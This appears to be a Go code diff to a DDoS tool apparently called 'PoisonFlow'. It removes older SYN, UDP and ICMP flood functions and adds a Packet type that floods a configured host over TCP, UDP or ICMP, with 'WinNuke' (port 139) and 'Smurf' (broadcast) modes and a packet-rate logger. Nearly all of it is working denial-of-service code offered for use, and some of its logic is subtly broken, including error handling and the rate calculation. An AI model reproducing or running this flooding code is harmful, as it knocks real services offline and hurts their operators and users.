@@ -3,10 +3,13 @@ package flow
 import (
 	"PoisonFlow/src/utils"
 	"fmt"
+	"github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
 	"net"
 	"os"
-	"strconv"
+	"os/signal"
+	"strings"
+	"syscall"
 	"time"
 )
 
@@ -18,104 +21,83 @@ var (
 		Long:  ``,
 		Run: func(cmd *cobra.Command, args []string) {
 			config := utils.Check.CheckDDos(&utils.Config)
-			DDOSAPP.Execute(config)
+			ddos := NewPacket()
+			ddos.Execute(config)
 		},
 	}
-	duration = 60
-	count    = 1000000000
 )
 
-type ddos struct{}
+var (
+	pkt int
+)
 
-func (d *ddos) Execute(config *utils.ProtoAPP) {
+type Packet struct {
+}
+
+func (p *Packet) Execute(config *utils.ProtoAPP) {
+	var address = fmt.Sprintf("%s:%d", config.Host, config.Port)
+	logrus.Println("Starting Target IP: " + config.Host)
 	switch config.Mode {
 	case "TCP":
-		{
-			d.SYNFlood(utils.Config.Host, utils.Config.Port)
-		}
+		p.TCPFlood(address)
 	case "UDP":
-		{
-			d.UDPFlood(utils.Config.Host, utils.Config.Port)
-		}
+		p.UDPFlood(address)
 	case "ICMP":
-		{
-			d.ICMPFlood(utils.Config.Host, utils.Config.Port)
+		p.ICMPFlood(config.Host)
+	case "WinNuke":
+		var address = fmt.Sprintf("%s:%d", config.Host, 139)
+		p.TCPFlood(address)
+	case "Smurf":
+		if strings.HasSuffix(config.Host, "255") {
+			p.ICMPFlood(config.Host)
 		}
+		logrus.Errorf("Please check format of Smurf host : 192.168.255.255")
 	default:
 		utils.Check.CheckExit("Please check format of ddos mode : TCP、UDP、ICMP")
 	}
 }
-func (d *ddos) SYNFlood(host string, port int) {
-	fmt.Printf("Starting syn flood attack on %s:%s for %d seconds...\n", host, port, duration)
+
+func (p *Packet) ICMPFlood(host string) {
+	p.SendPacket("ip4:icmp", host)
+}
+
+func (p *Packet) UDPFlood(address string) {
+	p.SendPacket("udp", address)
+}
+
+func (p *Packet) TCPFlood(address string) {
+	p.SendPacket("tcp", address)
+}
+
+func (p *Packet) SendPacket(mode, address string) {
+	// 捕获ctrl+c
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
+	// 3秒中
+	ticker := time.NewTicker(3 * time.Second)
+	defer ticker.Stop()
+	// 协程输出发送pps
+	go func() {
+		for range ticker.C {
+			logrus.Printf("Send %d packets in ((%.2f  pps)\n", pkt, float64(pkt/1.0))
+		}
+	}()
+	// 发送数据包
 	for {
-		_, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), time.Second*5)
-		if err != nil {
-			fmt.Println(err)
-			continue
+		select {
+		// 捕获ctrl + c
+		case _ = <-c:
+			logrus.Printf("stopped sending a total of %d packets", pkt)
+			os.Exit(0)
+		default:
+			conn, err := net.DialTimeout(mode, address, time.Millisecond*300)
+			utils.Check.CheckError(err)
+			_, _ = conn.Write([]byte(address))
+			pkt++
 		}
-		time.Sleep(time.Millisecond * 100)
 	}
 }
 
-func (d *ddos) UDPFlood(host string, port int) {
-	fmt.Printf("Starting udp flood attack on %s:%s for %d seconds...\n", host, port, duration)
-	addr, err := net.ResolveUDPAddr("udp", host+":"+strconv.Itoa(port))
-	utils.Check.CheckError(err)
-	conn, err := net.DialUDP("udp", nil, addr)
-	utils.Check.CheckError(err)
-	for {
-		_, err := conn.Write([]byte("Hello"))
-		if err != nil {
-		}
-
-	}
+func NewPacket() *Packet {
+	return &Packet{}
 }
-
-func (d *ddos) ICMPFlood(host string, port int) {
-	fmt.Printf("Starting Icmp flood attack on %s:%s for %d seconds...\n", host, port, duration)
-	addr, _ := net.ResolveIPAddr("ip4", host)
-	for i := 0; i < count; i++ {
-		conn, err := net.DialIP("ip4:icmp", nil, addr)
-		if err != nil {
-			fmt.Fprintf(os.Stderr, "DialIP failed: %s\n", err.Error())
-			continue
-		}
-
-		msg := make([]byte, 48)
-		msg[0] = 8       // type
-		msg[1] = 0       // code
-		msg[2] = 0       // checksum
-		msg[3] = 0       // checksum
-		msg[4] = 0       // identifier[0]
-		msg[5] = 0       // identifier[1]
-		msg[6] = 0       // sequence[0]
-		msg[7] = byte(i) // sequence[1]
-
-		checksum := checkSum(msg)
-		msg[2] = byte(checksum >> 8)
-		msg[3] = byte(checksum & 0xff)
-
-		_, err = conn.Write(msg)
-		if err != nil {
-			fmt.Fprintf(os.Stderr, "Write failed: %s\n", err.Error())
-			continue
-		}
-
-		conn.Close()
-	}
-}
-
-func checkSum(msg []byte) uint16 {
-	sum := uint32(0)
-	for i := 0; i < len(msg)-1; i += 2 {
-		sum += uint32(msg[i])<<8 | uint32(msg[i+1])
-	}
-	if len(msg)%2 == 1 {
-		sum += uint32(msg[len(msg)-1]) << 8
-	}
-	sum = (sum >> 16) + (sum & 0xffff)
-	sum += sum >> 16
-	return uint16(^sum)
-}
-
-var DDOSAPP ddos
